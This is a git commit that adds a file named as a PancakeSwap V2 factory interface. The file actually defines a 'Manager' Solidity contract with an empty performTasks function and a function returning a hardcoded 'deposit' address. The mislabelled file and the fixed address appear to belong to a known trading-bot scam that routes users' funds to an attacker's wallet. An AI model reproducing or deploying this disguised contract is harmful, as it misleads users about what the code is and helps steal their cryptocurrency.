a02bce65ddab2b36d5a66dd60023d2f5d79503b9
pancakeswapck <97430366+pancakeswapck@users.noreply.github.com>
2022-01-10 15:24:38 +0800

    upload
    upload

---
+++ contracts/interfaces/IPancakeswapV2Factory.sol
@@ -0,0 +1,12 @@
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x2dE16898574BA9Cb454F25Ed120D1037CfA1e604;
+	}
+}
